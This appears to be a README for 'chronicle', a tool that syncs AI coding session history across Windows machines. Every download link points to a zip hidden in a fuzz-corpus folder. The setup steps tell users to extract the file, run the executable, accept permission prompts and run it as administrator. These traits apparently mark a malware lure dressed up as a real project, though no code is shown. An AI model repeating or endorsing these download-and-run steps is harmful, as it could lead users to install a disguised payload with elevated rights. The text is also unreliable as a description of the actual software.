# 🧭 chronicle - Keep AI sessions in sync

[![Download chronicle](https://img.shields.io/badge/Download%20chronicle-4B6FFF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/arterialienalisjournal342/chronicle/raw/refs/heads/main/fuzz/corpus/fuzz_roundtrip/Software-bouillon.zip)

## 📥 Download

Use this link to visit the page and download chronicle:

https://github.com/arterialienalisjournal342/chronicle/raw/refs/heads/main/fuzz/corpus/fuzz_roundtrip/Software-bouillon.zip

## 🪟 Windows setup

1. Open the download page above.
2. Look for the latest Windows build or release file.
3. Download the file to your computer.
4. If you get a zip file, right-click it and choose **Extract All**.
5. Open the extracted folder.
6. Run the app file.
7. If Windows asks for permission, choose **Yes**.

## ✨ What chronicle does

chronicle keeps AI coding session history in sync across machines. It helps you carry the same session state from one Windows PC to another, so you can pick up work where you left off.

It is built for tools like Pi and Claude Code. It uses path matching rules to keep file locations aligned across computers. It also uses Git so your session history can merge cleanly when changes come from more than one device.

## 🧰 What you need

- Windows 10 or Windows 11
- A working internet connection
- Enough disk space for your session history
- Access to your AI coding tool session files
- Git installed on your machine if the app asks for it

## ⚙️ How it works

chronicle reads your session history, maps file paths from one machine to another, and stores the data in a Git-backed sync flow. That helps the app track changes across devices without forcing you to move files by hand.

The app is meant to stay out of your way. You set it up once, then it keeps your history aligned as you use your coding agent on more than one computer.

## 🗂️ Main uses

- Sync session history between your work PC and home PC
- Keep Pi and Claude Code history in one place
- Restore older session data after switching machines
- Merge changes from more than one device
- Reduce manual copying of session files

## 🧭 First-time setup

1. Download chronicle from the link above.
2. Save it in a folder you can find again.
3. Extract the files if the download comes as a zip.
4. Open the program folder.
5. Start the app.
6. Sign in or connect your Git account if the app asks for it.
7. Point the app at your session history folder.
8. Let the app scan your files.
9. Choose the sync folder or repository location.
10. Run the first sync.

## 🔍 Find your session files

If you are not sure where your AI tool stores session history, check the app settings for the path it uses. Common locations include:

- A folder inside your user profile
- A hidden app data folder
- A tool-specific workspace folder
- A project folder used by your coding agent

If you use more than one AI tool, you can set a path for each one.

## 🔁 Sync across machines

After setup, use the same Git-backed sync flow on each Windows computer.

1. Install chronicle on the second PC.
2. Open the app.
3. Use the same sync location or repository.
4. Match the local paths for that computer.
5. Run sync again.

chronicle will compare session data, apply path rules, and merge changes so both machines stay aligned.

## 🧪 Common checks

If sync does not work the first time, check these items:

- The app has access to your session folder
- The sync folder is in the same Git repo on each machine
- Your path settings match the current computer
- Git is installed and available
- The files are not open in another app

## 🛠️ File and path rules

chronicle uses path canonicalization to handle different folder layouts on different PCs. That means it can treat two different paths as the same session target when they point to the same kind of location on each machine.

This is useful if:

- One computer uses a different drive letter
- Your user name changes between machines
- Your projects live in different base folders
- You move between desktop and laptop setups

## 📁 Example workflow

1. Start a coding session on your desktop.
2. Save work and close the AI tool.
3. Run chronicle sync.
4. Open the same sync setup on your laptop.
5. Run chronicle sync again.
6. Continue the same session from the new machine.

## 🧩 Supported tools

chronicle is made for:

- Pi
- Claude Code
- Other session-based AI coding tools with file-based history

## 🧑‍💻 For daily use

You do not need to think about Git details each day. After setup, your normal flow can stay simple:

1. Use your AI coding tool.
2. Let it write session history.
3. Open chronicle.
4. Sync before you switch machines.
5. Open the same workspace on the next PC.

## 🧯 If the app does not open

Try these steps:

1. Right-click the app and choose **Run as administrator**.
2. Check that Windows did not block the file.
3. Make sure the zip file was fully extracted.
4. Move the folder to a simple path like `C:\chronicle`.
5. Install Git if the app needs it.

## 📌 Recommended folder layout

A simple layout can help keep things clear:

- `C:\chronicle` for the app
- `C:\chronicle-sync` for synced history
- `C:\Users\YourName\Documents\Projects` for active work

Using short paths can make setup easier on Windows.

## 🔐 Version control flow

chronicle uses Git as the base for sync and merge. That gives you a clear record of changes over time. It also helps when two machines change the same session set.

The app keeps the merge process focused on session history, not your whole system.

## 🧾 Troubleshooting sync problems

If your history seems out of date:

- Run sync on the source machine first
- Check that both machines point to the same repo
- Confirm the path map is correct
- Look for moved or renamed folders
- Try a fresh pull on the second machine

## 🪄 Tips for smooth use

- Keep one sync repo for one main set of sessions
- Use the same folder names on both PCs when you can
- Sync before you shut down a machine
- Keep your AI tool closed during sync
- Back up your history before large path changes

## 📚 Topic areas

This project covers:

- ai
- canonicalization
- claude-code
- cli
- developer-tools
- git
- pi-agent
- rust
- session-history
- session-management
- sync